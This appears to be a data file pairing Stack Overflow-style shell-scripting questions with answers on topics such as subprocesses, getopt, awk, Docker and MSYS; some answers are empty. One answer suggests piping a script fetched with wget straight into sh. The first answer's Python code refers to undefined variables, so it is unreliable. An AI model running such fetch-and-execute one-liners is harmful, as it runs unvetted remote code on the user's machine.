    "Use python's pty to create a live console": "If your application is going to work asynchronously with multiple tasks, like reading data from stdout and then writing it to a websocket, I suggest using asyncio.\nHere is an example that runs a process and redirects its output into a websocket:\nimport asyncio.subprocess\nimport os\n\nfrom aiohttp.web import (Application, Response, WebSocketResponse, WSMsgType,\n                         run_app)\n\n\nasync def on_websocket(request):\n    # Prepare aiohttp's websocket...\n    resp = WebSocketResponse()\n    await resp.prepare(request)\n    # ... and store in a global dictionary so it can be closed on shutdown\n    request.app['sockets'].append(resp)\n\n    process = await asyncio.create_subprocess_exec(sys.executable,\n                                                   '/tmp/test.py',\n                                                    stdout=asyncio.subprocess.PIPE,\n                                                    stderr=asyncio.subprocess.PIPE,\n                                                    bufsize=0)\n    # Schedule reading from stdout and stderr as asynchronous tasks.\n    stdout_f = asyncio.ensure_future(p.stdout.readline())\n    stderr_f = asyncio.ensure_future(p.stderr.readline())\n\n    # returncode will be set upon process's termination.\n    while p.returncode is None:\n        # Wait for a line in either stdout or stderr.\n        await asyncio.wait((stdout_f, stderr_f), return_when=asyncio.FIRST_COMPLETED)\n\n        # If task is done, then line is available.\n        if stdout_f.done():\n            line = stdout_f.result().encode()\n            stdout_f = asyncio.ensure_future(p.stdout.readline())\n            await ws.send_str(f'stdout: {line}')\n\n        if stderr_f.done():\n            line = stderr_f.result().encode()\n            stderr_f = asyncio.ensure_future(p.stderr.readline())\n            await ws.send_str(f'stderr: {line}')\n\n    return resp\n\n\nasync def on_shutdown(app):\n    for ws in app['sockets']:\n        await ws.close()    \n\n\nasync def init(loop):\n    app = Application()\n    app['sockets'] = []\n    app.router.add_get('/', on_websocket)\n    app.on_shutdown.append(on_shutdown)\n    return app\n\n\nloop = asyncio.get_event_loop()\napp = loop.run_until_complete(init())\nrun_app(app)\nIt uses aiohttp and is based on the web_ws and subprocess streams examples.",
    "How do I run an extensionless (maybe ELF) file on Ubuntu?": "My guess is that this is 32 bit compile on a 64 bit system. I cross compiled a small c file into a binary using the -m32 option on gcc. This also needed a few extra packages. The resulting a.out looks like this.\n% file a.out\na.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=be02470c8337b96e7deaaff323bc53865991c3ab, not stripped\nCompare this to a native system binary\n% file /bin/ls\n/bin/ls: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0823e17cafbe5b2296346216445566840fdfd88, stripped\nRunning the a.out shows me this.\n% ./a.out\nzsh: no such file or directory: ./a.out\nThe specific \"Command not found\" message is something, I think, bash prints. I use zsh myself.\nTo get this to work, you can install the multilib packages. I didn't narrow it down to the exact package but installing gcc-multilib on Debian pulls in everything you need. After installing that, here's what I get.\n% ./a.out\n3.140523\n(the program is supposed to estimate the value of PI).\nNote: I actually needed to install gcc-multilib just to compile the file. I then uninstalled the packages to mimic a 64 bit system that doesn't have the 32 bit runtime libraries that the thing needs.",
    "Shell Scripting unwanted '?' character at the end of file name": "It sounds like your script file has DOS-style line endings (\\r\\n) instead of unix-style (just \\n) -- when a script in this format, the \\r gets treated as part of the commands. In this instance, it's getting included in $emplid and therefore in the filename.\nMany platforms support the dos2unix command to convert the file to unix-style line endings. And once it's converted, stick to text editors that support unix-style text files.\nEDIT: I had assumed the problem line endings were in the shell script, but it looks like they're in the input file (\"$i\".txt) instead. You can use dos2unix on the input file to clean it and/or add a cleaning step to the sed command in your script. BTW, you can have a single instance of sed apply several edits with the -e option:\nemplid=$(grep -a \"Student ID\" \"$i\".txt  | sed '-e s/(Student ID:  //g' -e 's/)Tj//g' -e $'s/\\r$//' )\nI'd recommend against using sed 's/.$//' -- if the file is in unix format, that'll cut off the last character of the filename.",
    "How to find if Mongodb is running in auth mode in shell script?": "If you just want to test whether you can connect to a MongoDB server without authentication via bash, you can use a script similar to the following:\n#!/bin/bash\n\n# Connect to MongoDB address (host:port/dbname) specified as first parameter\n# If no address specified, `mongo` default will be localhost:27017/test\nisAuth=`mongo --eval \"db.getUsers()\" $1 | grep \"not auth\"`\n\nif [ -z \"$isAuth\" ] ;\nthen\n   echo \"mongod auth is NOT enabled\"\n   exit 1\nelse\n   echo \"mongod auth is ENABLED\"\n   exit 0\nfi\nExample output:\n$ ./isAuthEnabled.sh localhost:27017\nmongod auth is ENABLED\n\n$ ./isAuthEnabled.sh localhost:27777\nmongod auth is NOT enabled\nThe only parameter for this script is an an optional MongoDB address to connect to (host:port/dbname); the mongo shell defaults to using localhost:27017/test.\nThe script does a simple check on whether users can be listed without permission.\nIf auth is properly enabled, the db.getUsers() command should return an error like:\n  \"Error: not authorized on test to execute command { usersInfo: 1.0 }\"\nNewer versions\nNote that the error message has changed in the newer version of MongoDB, so you may need to grep \"requires authentication\" instead of not auth\nNote: Localhost Exception\nBy default (as at MongoDB 3.0) there is a localhost exception that allows you to create a first user administrator for a deployment by connecting via localhost. Once at least one user has been added, the localhost exception is automatically disabled.\nIf you want to check the full security of your deployment, it's definitely worth reviewing the MongoDB Security checklist.",
    "Python Fabric: How to handle arbitrary remote shell prompt for input?": "I have proposed an API for this feature in fabric on the mailinglist, and ended up writing something myself:\nfrom fexpect import expect, expecting, run \n\nprompts = []\nprompts += expect('What is your name?','John')\nprompts += expect('Where do you live?','New York')\n\nwith expecting(prompts):\n    run('command')\nSee my blogpost on expecting prompts in fabric with fexpect",
    "Error while executing adb command programmatically": "",
    "Declaring arrays in ZSH": "From man zshbuiltins, under the entry for typeset (of which declare is a synonym):\nFor each name=value assignment, the parameter name is set to value. Note that arrays currently cannot be assigned in typeset expressions, only scalars and integers.\nTry this instead:\ndeclare -a FILES_TO_SOURCE\nFILES_TO_SOURCE=(\n    \"bash_aliases\"\n    \"bash_exports\"\n    \"bash_functions\"\n    \"bash_options\"\n    \"bash_prompt\"\n    \"bash.local\"\n)\ndeclare -r FILES_TO_SOURCE\nThat being said that list of files is going to have to change here too most likely for compatibility (assuming you've used bash-isms in those files which seems likely).",
    "Git diff - ignore reorder": "The diffing tools are usually implemented in terms of the Myers' diff algorithm. There isn't much that you can do to control the behaviour of GNU/git/diff. (There are a couple of switches that you can pass to diff to affect the behaviour, but in your case they are irrelevant.)\nYou could simply post-process the output and remove the duplicate lines, for example you can pipe your diff through the following awk script that will remove (duplicate) -/+ reordering.\ngit diff | awk '{ seen[substr($0,2)]++; l[i++] = $0; } END { for (j = 0; j < i; ++j) if (seen[substr(l[j],2)] < 2) print l[j] }'\nFor your example, the output would be,\ndiff --git a/numbers b/numbers\nindex 5f5fbe7..d184fef 100644\n--- a/numbers\n+++ b/numbers\n@@ -1,3 +1,3 @@\n-1\n+4\n 2",
    "When did HUP stop getting sent and what can I do about it?": "I believe you're looking for the huponexit shell option. You can set this easily with\n$ shopt -s huponexit\nSome details from the bash man page:\nThe shell exits by default upon receipt of a SIGHUP. Before exiting, an interactive shell resends the SIGHUP to all jobs, running or stopped. Stopped jobs are sent SIGCONT to ensure that they receive the SIGHUP. To prevent the shell from sending the signal to a par- ticular job, it should be removed from the jobs table with the disown builtin (see SHELL BUILTIN COMMANDS below) or marked to not receive SIGHUP using disown -h.\nIf the huponexit shell option has been set with shopt, bash sends a SIGHUP to all jobs when an interactive login shell exits.",
    "CLI: implement something like git commit (open a text editor and get value)": "Typically, you do four things:\nCreate a temporary file\nFork an external process which execs the program specified in the environment variable $EDITOR, giving the name of the temporary file as an argument.\nWait for the process to return.\nOpen and read from the temporary file to see what the user wrote.",
    "Xcode 9 : Block Based KVO Violation for observeValue function": "",
    "Exit tcsh script if error": "In (t)csh, set is used to define a variable; set foo = bar will assign the value bar to the variable foo (like foo=bar does in Bourne shell scripting).\nIn any case, from tcsh(1):\nArgument list processing\n   If the first argument (argument 0) to the shell is `-'  then  it  is  a\n   login shell.  A login shell can be also specified by invoking the shell\n   with the -l flag as the only argument.\n\n   The rest of the flag arguments are interpreted as follows:\n\n[...]\n\n   -e  The  shell  exits  if  any invoked command terminates abnormally or\n       yields a non-zero exit status.\nSo you need to invoke tcsh with the -e flag. Let's test it:\n% cat test.csh\ntrue\nfalse\n\necho \":-)\"\n\n% tcsh test.csh\n:-)\n\n% tcsh -e test.csh\nExit 1\nThere is no way to set this at runtime, like with sh's set -e, but you can add it to the hashbang:\n#!/bin/tcsh -fe\nfalse\nso it gets added automatically when you run ./test.csh, but this will not add it when you type csh test.csh, so my recommendation is to use something like a start.sh which will invoke the csh script:\n#!/bin/sh\ntcsh -ef realscript.csh",
    "fuzzy string matching with grep": "There used to be a tool called agrep for fuzzy regex matching, but it got abandoned.\nhttp://en.wikipedia.org/wiki/Agrep has a bit of history and links to related tools.\nhttps://github.com/Wikinaut/agrep looks like a revived open source release, but I have not tested it.\nFailing that, see if you can find tre-agrep for your distro.",
    "Print a string with its special characters printed as literal escape sequences": "Bash has a string quoting operation ${var@Q}\nHere is some example code\nbash_encode () {\n  esc=${1@Q}\n  echo \"${esc:2:-1}\" \n}\n\ntestval=$(printf \"hello\\t\\tworld\")\nset | grep \"^testval=\"\necho \"The encoded value of testval is\" $(bash_encode \"$testval\")\nHere is the output\ntestval=$'hello\\t\\tworld'\nThe encoded value of testval is hello\\t\\tworld",
    "Is it possible to make this shell script faster?": "An important point here is probably inter-process I/O. The Python script has all data in memory, so no I/O happens while it processes the data.\nAlso note that Python isn't slow as such. Most functionality in Python is implemented in C.\nThe shell script has to start 5 processes and each of them has to read the whole text from stdin and write the whole text to stdout four times.\nThere might be a way to make the Python script a bit faster: You can read the whole text into a single string, then remove all punctuation, split words and then count them:\ntext = file.read()\ntext = re.sub(r'[.,:;-_]', '', text)\ntext = text.upper()\nwords = re.split(r'\\\\s+', text)\nc = Counter()\nc.update(words)\nThat would avoid the overhead of several nested loops.\nAs for the shell script: You should try to reduce the number of processes. The three tr processes could probably be replaced with one call to sed.",
    "shell script for byobu commands": "I think you are missing the first line from your shell script. See if this works\n#!/bin/sh\n# byobu_launcher.sh ver 20170915122301 Copyright 2017 alexx, MIT Licence ver 1.0\n\nbyobu new-session -d -s $USER\n\n# redis window\nbyobu rename-window -t $USER:0 'redis-cli'\nbyoby send-keys \"redis-cli\" C-m\nbyobu split-window -v\n\n# mongod\nbyobu new-window -t $USER:1 -n 'mongod'\nbyobu send-keys \"sudo mongod --port 27017 --dbpath /data/db/rs0 --replSet rs0\" C-m\n\n# mongo\nbyobu new-window -t $USER:1 -n 'mongo'\nbyobu send-keys \"mong\" C-m\n\n# Set default window as the dev split plane\nbyobu select-window -t $USER:1\n\n# Attach to the session you just created\n# (flip between windows with alt -left and right)\nbyobu attach-session -t $USER\nwith screen you can do this by adding to the end of ~/.screenrc\nscreen -t redis-cli 0\nstuff \"redis-cli\\n\"\nscreen -t mongod 1\nstuff \"sudo mongod --port 27017 --dbpath /data/db/rs0 --replSet rs0\\n\"\nscreen -t mongo 2\nstuff \"mongo\\n\"\nselect 1\nI mostly use screen and sometimes use tmux. I haven't used byoby.",
    "Compare md5 sums in bash script": "For anyone coming here looking to compare a file to a specific md5 sum, you can try this function:\nfunction checkmd5() {\n  md5_to_test=$1\n  md5_from_file=$(md5sum \"$2\" | cut -d \" \" -f1)\n  md5_results=\"Input: $md5_to_test\\nFile:  $md5_from_file\"\n  if [[ $md5_to_test == $md5_from_file ]]\n    then\n      echo -e \"\\n\\e[92mSUCCESS\\e[39m\\n$md5_results\"\n    else\n      echo -e \"\\n\\e[91mFAILURE\\e[39m\\n$md5_results\"\n  fi\n}\nAnd then just use it like:\n$ checkmd5 <SOME_MD5_SUM> filepath/file.abc",
    "How to prevent SQL injection in MySQL's command-line shell interface?": "You can base64 encode the value, and then base64 decode it once it's in MySQL. There are UDFs in MySQL for converting Base64 data to common data. Additionally, most systems either have uuencode, or the 'base64' command for base64 encoding data.",
    "Execute the content of binary from a pipe": "I believe the answer is no.\nYou can execute a file manually by passing it to the Linux loader, which will be named something like /lib/ld-linux.so.* It needs an actual file, though. It can't execute a pipe or stdin; it needs to be able to mmap() the file.\n$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/true\n$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 - < /bin/true\n-: error while loading shared libraries: -: cannot open shared object file: No such file or directory\n$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 <(cat /bin/true)\n/dev/fd/63: error while loading shared libraries: /dev/fd/63: invalid ELF header\n* On my Red Hat machine it's /lib/ld-linux.so.2 (32-bit) or /lib64/ld-linux-x86-64.so.2 (64-bit). On my Ubuntu machine it's /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.",
    "VBA: How to run another application from MS Access": "I always use ShellExecute from the Windows API when I need to execute something in VBA.\nAs far as I know, it works on machines without full privileges as well.\nExample:\nDeclare Function ShellExecute Lib \"shell32.dll\" Alias \"ShellExecuteA\" (ByVal hwnd As Long, _\n    ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, _\n    ByVal lpDirectory As String, ByVal lpnShowCmd As Long) As Long\n\n\nPublic Sub ShellEx(ByVal Path As String, Optional ByVal Parameters As String, Optional ByVal HideWindow As Boolean)\n\n    If Dir(Path) > \"\" Then\n        ShellExecute 0, \"open\", Path, Parameters, \"\", IIf(HideWindow, 0, 1)\n    End If\n\nEnd Sub\nNow you can call ShellEx to run pretty much anything:\n'run executable\nShellEx \"c:\\mytool.exe\"\n\n'open file with default app\nShellEx \"c:\\someimage.jpg\"\n\n'open explorer window\nShellEx \"c:\\\"\nNote that ShellEx has two optional parameters as well.\nI didn't show this in the above examples, but you can:\npass parameters to executables\nhide the window of the called executable",
    "How to get the elapsed time in milliseconds in a bash script?": "The date command you're using doesn't support %N so your output is literally 1292460931N. I tried it on Linux and it worked, but on FreeBSD I see the results you got. Run that date command in a shell and see what comes out. Is it possible you're using busybox? Its cut-down date command also omits %N but the version I just tried gave me 1292463535%N.",
    "How do I launch a file in its default program, and then close it when the script finishes?": "The problem lies within the fact, that the process being handled by the Popen class in your case is the start shell command process, which terminates just after it runs the application associated with given file type. The solution is to use the /WAIT flag for the start command, so the start process waits for its child to terminate. Then, using for example the psutil module you can achieve what you want with the following sequence:\n>>> import psutil\n>>> import subprocess\n>>> doc = subprocess.Popen([\"start\", \"/WAIT\", \"file.pdf\"], shell=True)\n>>> doc.poll()\n>>> psutil.Process(doc.pid).get_children()[0].kill()\n>>> doc.poll()\n0\n>>> \nAfter the third line Adobe Reader appears with the file opened. poll returns None as long as the window is open thanks to the /WAIT flag. After killing start's child Adobe Reader window disappears.\nOther probably possible solution would be to find the application associated with given file type in the registry and run it without using start and shell=True.\nI've tested this on 32 bit Python 2.7.5 on 64 bit Windows Vista, and 32 bit Python 2.7.2 on 64 bit Windows 7. Below is an example run on the latter. I've made some simple adjustments to your code - marked with a freehand red circles (!).\nAlso, possibly it is worth to consider this comment from the documentation:\nThe shell argument (which defaults to False) specifies whether to use the shell as the program to execute. If shell is True, it is recommended to pass args as a string rather than as a sequence.\nand run the process as follows:\nsubprocess.Popen(\"start /WAIT \" + self.file, shell=True)",
    "docker run script which exports env variables": "There's no way to export a variable from a script to a child image. As a general rule, environment variables travel down, never up to a parent.\nENV will persist in the build environment and to child images and containers.\nDockerfile\nFROM busybox\nENV PLATFORM_HOME test\nRUN echo $PLATFORM_HOME\nDockerfile.child\nFROM me/platform\nRUN echo $PLATFORM_HOME\nCMD [\"sh\", \"-c\", \"echo $PLATFORM_HOME\"]\nBuild the parent\ndocker build -t me/platform .\nThen build the child:\n\u2192 docker build -f Dockerfile.child -t me/platform-test  .\nSending build context to Docker daemon  3.072kB\nStep 1/3 : FROM me/platform\n ---> 539b52190af4\nStep 2/3 : RUN echo $PLATFORM_HOME\n ---> Using cache\n ---> 40e0bfa872ed\nStep 3/3 : CMD sh -c echo $PLATFORM_HOME\n ---> Using cache\n ---> 0c0e842f99fd\nSuccessfully built 0c0e842f99fd\nSuccessfully tagged me/platform-test:latest\nThen run\n\u2192 docker run --rm me/platform-test\ntest",
    "Bash line comment continuation": "According to the Advanced Bash-Scripting Guide, it looks like this is one of several comment headers one can use to improve clarity and legibility in scripts. This tidbit is presented in the \"Assorted Tips\" section of the guide:\nUse special-purpose comment headers to increase clarity and legibility in scripts.\nHere are several of the ones they list in the example block from the guide:\n## Caution.\nrm -rf *.zzy   ##  The \"-rf\" options to \"rm\" are very dangerous,\n               ##+ especially with wild cards.\n\n#+ Line continuation.\n#  This is line 1\n#+ of a multi-line comment,\n#+ and this is the final line.\n\n#* Note.\n\n#o List item.\n\n#> Another point of view.\nwhile [ \"$var1\" != \"end\" ]    #> while test \"$var1\" != \"end\"\nApparently some people find these little bits helpful, but I personally don't see much benefit in doing it.",
    "Bash git alias tab completion error": "I had the exact same problem. For example, I had an alias for deleting a local branch and its remote counterpart in one go:\n[alias]\ndb = \"!f() { git branch -d $1 && git push origin :$1; }; f\"\nIn order to fix the problem, I removed the alias and added a file named git-db to my Git scripts directory. It can be any directory in the PATH. Here's the contents of the file.\n#!/bin/sh\n\ngit branch -d $1 && git push origin :$1\nNote that the file must not have an extension. It can be used just like the alias:\ngit db mybranch",
    "Shell read *sometimes* strips trailing delimiter": "Yes, that's standard behaviour (see the read specification and Field Splitting). A few shells (ash-based including dash, pdksh-based, zsh, yash at least) used not to do it, but except for zsh (when not in POSIX mode), busybox sh, most of them have been updated for POSIX compliance.\nThat's the same for:\n$ var='a:b:c:' IFS=:\n$ set -- $var; echo \"$#\"\n3\n(see how the POSIX specification for read actually defers to the Field Splitting mechanism where a:b:c: is split into 3 fields, and so with IFS=: read -r a b c, there are as many fields as variables).\nThe rationale is that in ksh (on which the POSIX spec is based) $IFS (initially in the Bourne shell the internal field separator) became a field delimiter, I think so any list of elements (not containing the delimiter) could be represented.\nWhen $IFS is a separator, one can't represent a list of one empty element (\"\" is split into a list of 0 element, \":\" into a list of two empty elements\u00b9). When it's a delimiter, you can express a list of zero element with \"\", or one empty element with \":\", or two empty elements with \"::\".\nIt's a bit unfortunate as one of the most common usages of $IFS is to split $PATH. And a $PATH like /bin:/usr/bin: is meant to be split into \"/bin\", \"/usr/bin\", \"\", not just \"/bin\" and \"/usr/bin\".\nNow, with POSIX shells (but not all shells are compliant in that regard), for word splitting upon parameter expansion, that can be worked around with:\nIFS=:; set -o noglob\nfor dir in $PATH\"\"; do\n  something with \"${dir:-.}\"\ndone\nThat trailing \"\" makes sure that if $PATH ends in a trailing :, an extra empty element is added. And also that an empty $PATH is treated as one empty element as it should be.\nThat approach can't be used for read though.\nShort of switching to zsh, there's no easy work around other than inserting an extra : and remove it afterwards like:\necho a:b:c: | sed 's/:/::/2' | { IFS=: read -r x y z; z=${z#:}; echo \"$z\"; }\nOr (less portable):\necho a:b:c: | paste -d: - /dev/null | { IFS=: read -r x y z; z=${z%:}; echo \"$z\"; }\nI've also added the -r which you generally want when using read.\nMost likely here you'd want to use a proper text processing utility like sed/awk/perl instead of writing convoluted and probably inefficient code around read which has not been designed for that.\n\u00b9 Though in the Bourne shell, that was still split into zero elements as there was no distinction between IFS-whitespace and IFS-non-whitespace characters there, something that was also added by ksh",
    "postbuild UIAutomation script not running in jenkins": "",
    "What is the cleanest way to create a non-linear pipeline?": "I can suggest a version without temporary files, and with two fifo-s:\nfifo1=/tmp/fifo1\nfifo2=/tmp/fifo2\nrm $fifo1\nrm $fifo2\nmkfifo $fifo1\nmkfifo $fifo2\n\nircpingpong < $fifo2 > $fifo1 &\n(mksock <$fifo1|tee $fifo2 )&\nirclogin >$fifo1 &\ncat >$fifo1\nThe idea is to run all programs separately, and only ensure that input and output of each program is redirected properly according to this diagram:\nOf course, ircpingpong must read stdin and write to stdout, irclogin must write to stdout, and mksock must read from stdin and write to stdout.",
    "OpenSSL RSA signing with SHA256 digest": "Somehow, I ended up mistaken, and it appears that these two scripts are indeed producing the same output. Sorry.",
    "How to handle out of memory gracefully in shell scripts": "Not that I'm aware of. Instead, when you hit a problem like this, the normal approach is to raise the limits via ulimit.\nulimit -m N # for the heap\nulimit -s N # for the stack\nHowever, to programmatically detect it, you'd have to do functionality similar to what strace does and watch for ENOMEM.",
    "Setting environment variables at Qt Creator by sourcing a shell script": "Ofcorse, You can run qt via scrypt. This is very simply. My script is below. Ofcorse you need environment variables in concret file. In my case this file is environment-setup\n#!/bin/bash\necho \"ustawienie zmiennej /usr/local/angstrom/arm/environment-setup\"\n# set concret variables important is . /\n. /usr/local/angstrom/arm/environment-setup\necho \"Uruchomienie qtCreator\"\n# lunched qtcreator\n$HOME/Qt/Tools/QtCreator/bin/qtcreator\nYou also can set this script as linked to main icon qt in your start menu. After this, all you need to run qt is only click in your shortcut in menu",
    "Shell Script Invocation Error: no such file or directory in xcode 8 with swift 3": "",
    "wget and run/remove bash script in one line": "I like to pipe it into sh. No need to create and remove file locally.\nwget http://sitehere.com/install.sh -O - | sh",
    "Using msys shell in Visual Studio Code": "According to the msys.bat script, the actual executable that is launched depends on your TTY settings. The default setting uses the native command prompt and launches the sh.exe file as you can see from the following snippet:\n:startsh\nif NOT EXIST %WD%sh.exe goto notfound\nstart %WD%sh --login -i\nexit\nTo get this to work in Visual Studio Code, you will need to add the following user settings:\n\"terminal.integrated.shell.windows\": \"C:\\\\MinGW\\\\msys\\\\1.0\\\\bin\\\\sh.exe\",\n\"terminal.integrated.shellArgs.windows\": [\"--login\", \"-i\"]\nThe path to the sh.exe file may be different depending on your install location for MSYS.\nEDIT: (2019-01-20)\nWhile the above still works for MSYS v1.0, I have since switched over to MSYS2 (https://www.msys2.org/). You can use the following settings to setup your Visual Studio Code to work with MSYS2 just as for v1.0 (once again, your install location might be different than mine):\n\"terminal.integrated.shell.windows\": \"C:\\\\msys64\\\\usr\\\\bin\\\\bash.exe\",\n\"terminal.integrated.shellArgs.windows\": [\"--login\", \"-i\"]\nFor extra-credit, we are going to modify an environment variable so that we always open the terminal in the current directory. There are various ways to accomplish this via scripting etc. However, the simplest way to do it, in my opinion, is to use the CHERE_INVOKING environment variable. By setting this flag to 1 it will inform the shell to use the current directory as the default entry point. Here is a complete tutorial on how to enable this flag:\nPress the windows key and type run and hit enter\nIn the run dialog, type the following:\nrundll32.exe sysdm.cpl,EditEnvironmentVariables\nIn the Environment Variables dialog that is opened, add a new user variable called CHERE_INVOKING and set it's value to 1.\nWith this flag enabled in the Windows system, it should automatically open the terminal from the location where you called the bash.exe executable. For Visual Studio Code, this will be your root project directory. Enjoy!",
    "How to run multiple Unix commands in one time?": "Short answer is, yes. The concept is known as shell scripting, or bash scripts (a common shell). In order to create a simple bash script, create a text file with this at the top:\n#!/bin/bash\nThen paste your commands inside of it, one to a line.\nSave your file, usually with the .sh extension (but not required) and you can run it like:\nsh foo.sh\nOr you could change the permissions to make it executable:\nchmod u+x foo.sh\nThen run it like:\n./foo.sh\nLots of resources available on this site and the web for more info, if needed.",
    "How can I tell if an extensionless image is png or jpeg": "The \"magic code\" for a\nPNG file should begin with 89 50 4E 47 0D 0A 1A 0A\nJPEG files begin with FFD8 and end with FFD9",
    "list of methods for python shell?": "Existing answers do a good job of showing you how to get the ATTRIBUTES of an object, but do not precisely answer the question you posed -- how to get the METHODS of an object. Python objects have a unified namespace (differently from Ruby, where methods and attributes use different namespaces). Consider for example:\n>>> class X(object):\n...   @classmethod\n...   def clame(cls): pass\n...   @staticmethod\n...   def stame(): pass\n...   def meth(self): pass\n...   def __init__(self):\n...     self.lam = lambda: None\n...     self.val = 23\n... \n>>> x = X()\n>>> dir(x)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__',\n '__getattribute__', '__hash__', '__init__', '__module__',\n '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__',\n '__sizeof__', '__str__', '__subclasshook__', '__weakref__',\n 'clame', 'lam', 'meth', 'stame', 'val']\n((output split for readability)).\nAs you see, this is giving you the names of all attributes -- including plenty of special methods that are just inherited from object, special data attributes such as __class__, __dict__ and __doc__, per-instance data attributes (val), per-instance executable attributes (lam), as well as actual methods.\nIf and when you need to be more selective, try:\n>>> import inspect\n>>> [n for n, v in inspect.getmembers(x, inspect.ismethod)]\n['__init__', 'clame', 'meth']\nStandard library module inspect is the best way to do introspection in Python: it builds on top of the built-in introspection hooks (such as dir and more advanced ones) to offer you useful, rich, and simple introspection services. Here, for example, you see that only instance and class methods specifically designed by this class are shown -- not static methods, not instance attributes whether callable or not, not special methods inherited from object. If your selectivity needs are slightly different, it's easy to build your own tweaked version of ismethod and pass it as the second argument of getmembers, to tailor the results to your precise, exact needs.",
    "reverse a file in Unix shell": "You can use the surprisingly helpful tac from GNU Coreutils.\ntac -s \",\" parse.txt > newparse.txt\ntac by default will \"cat\" the file to standard out, reversing the lines. By specifying the separator using the -s flag, you can simply reverse your fields as desired.\n(You may need to do a post-processing step to get the commas to work out correctly, which can be another step in your pipeline.)",
    "AWK command to print until end of line": "I know this question is very old, but another awk example:\nawk '{print substr($0,index($0,$5))}' fileName\nWhat it does: find the index where you want to start printing (index of $5 in $0) and print the substring of $0 starting at that index.\nCaveat:\nAs stated in comments, this will faill if $5 is not unique in prior fields.",
    "assigning value to shell variable using a function return value from Python": "You can print your value in Python, like this:\nprint fooPy()\nand in your shell script:\nfooShell=$(python fooPy.py)\nBe sure not to leave spaces around the = in the shell script.",
    "Verifying that a copy succeeded": "$? refers to the last command:\n#!/bin/sh\ncp home/testing/present.txt home/testing/future.txt\n   echo \"Copy Code: $? - Successful\"   # last command: cp\nif [ $? != 0 ]; then                   # last command: echo\n   echo \"Copy Code: $? - Unsuccessful\" # last command: [\nfi\nIf you want to repeatedly work with the status of a specific command, just save the result in another variable:\n#!/bin/sh\ncp home/testing/present.txt home/testing/future.txt\nstatus=$?\necho \"Copy Code: $status - Successful\"\nif [ $status != 0 ]; then\n   echo \"Copy Code: $status - Unsuccessful\"\nfi\nHowever, a better approach is to simply test the cp command in the first place:\nif cp home/testing/present.txt home/testing/future.txt\nthen\n  echo \"Success\"\nelse\n  echo \"Failure, exit status $?\"\nfi",
    "Windows Powershell: Shortcut for change directory": "There is also another way to do this:\nfunction PP { cd C:\\Users\\Username\\Dropbox\\Websites\\2014\\Projects\\ProjectName }",
    "Why mkdir fails to work with tilde (~)?": "~ is known only to the shell and not to the mkdir system call.\nBut if you try:\nsystem(\"mkdir ~/foo\");\nthis works as the \"mkdir ~/foo\" is passed to a shell and shell expands ~ to $HOME\nIf you want to make use of the $HOME with mkdir, you can make use of the getenv function as:\nchar path[MAX];\nchar *home = getenv (\"HOME\");\nif (home != NULL) {\n        snprintf(path, sizeof(path), \"%s/new_dir\", home);\n        // now use path in mkdir\n        mkdir(path, PERM);\n}",
    "Cross-platform getopt for a shell script": "There are essentially two versions of the getopt command: the original version and the GNU enhanced version. The GNU enhanced version is backward compatible with the original version, so if you only use the features of the original version it will work with both.\nDetect which version of getopt is available\nYou can detect which version is available and use the enhanced features if the GNU enhanced version is available, and limit yourself to the original features if the GNU enhanced version is not available. The enhanced version has a -T option for testing which version is available.\ngetopt -T > /dev/null\nif [ $? -eq 4 ]; then\n    # GNU enhanced getopt is available\n    set -- `getopt --long help,output:,version --options ho:v -- \"$@\"`\nelse\n    # Original getopt is available\n    set -- `getopt ho:v \"$@\"`\nfi\nConsider using built-in shell command getopts (with an \"s\") instead, because it is more portable. However, getopts does not support long options (e.g. --help).\nIf you like long options, use getopt and use the above test to see if the GNU enhanced version of getopt is available or not. If the enhanced version is not available, the script can gracefully degrade to either using the original version of getopt (with no support for long option names and no whitespace support) or using getopts (with no support for long option names).\nUsing GNU enhanced getopt properly\nGetting the GNU enhanced version to process arguments with whitespace properly is tricky. Here's how it is done:\nARGS=`getopt --long help,output:,verbose --options ho:v -- \"$@\"`\nif [ $? -ne 0 ]; then\n  echo \"Usage error (use -h for help)\" >&2\n  exit 2\nfi\neval set -- $ARGS\n\n# Parameters are now sorted: options appear first, followed by --, then arguments\n# e.g. entering: \"foo bar\" -o abc baz -v\n#      produces: -o 'abc' -v -- 'foo bar' 'baz'\nThe secret is to use \"$@\" where the double quotes are very important (in line 1), and to eval the set command (in line 6).\nSo errors raised by getopt can be detected and handled, the call to getopt is done separately from the eval with the two linked by the ARGS variable.\nComplete working example\nPROG=`basename $0`\n\ngetopt -T > /dev/null\nif [ $? -eq 4 ]; then\n  # GNU enhanced getopt is available\n  ARGS=`getopt --name \"$PROG\" --long help,output:,verbose --options ho:v -- \"$@\"`\nelse\n  # Original getopt is available (no long option names, no whitespace, no sorting)\n  ARGS=`getopt ho:v \"$@\"`\nfi\nif [ $? -ne 0 ]; then\n  echo \"$PROG: usage error (use -h for help)\" >&2\n  exit 2\nfi\neval set -- $ARGS\n\nwhile [ $# -gt 0 ]; do\n    case \"$1\" in\n        -h | --help)     HELP=yes;;\n        -o | --output)   OUTFILE=\"$2\"; shift;;\n        -v | --verbose)  VERBOSE=yes;;\n        --)              shift; break;; # end of options\n    esac\n    shift\ndone\n\nif [ $# -gt 0 ]; then\n  # Remaining parameters can be processed\n  for ARG in \"$@\"; do\n    echo \"$PROG: argument: $ARG\"\n  done\nfi\n\necho \"$PROG: verbose: $VERBOSE\"\necho \"$PROG: output: $OUTFILE\"\necho \"$PROG: help: $HELP\"\nThis example can be downloaded from https://gist.github.com/hoylen/6607180\nThe comparison table on Wikipedia's entry on getopts compares the different features.",
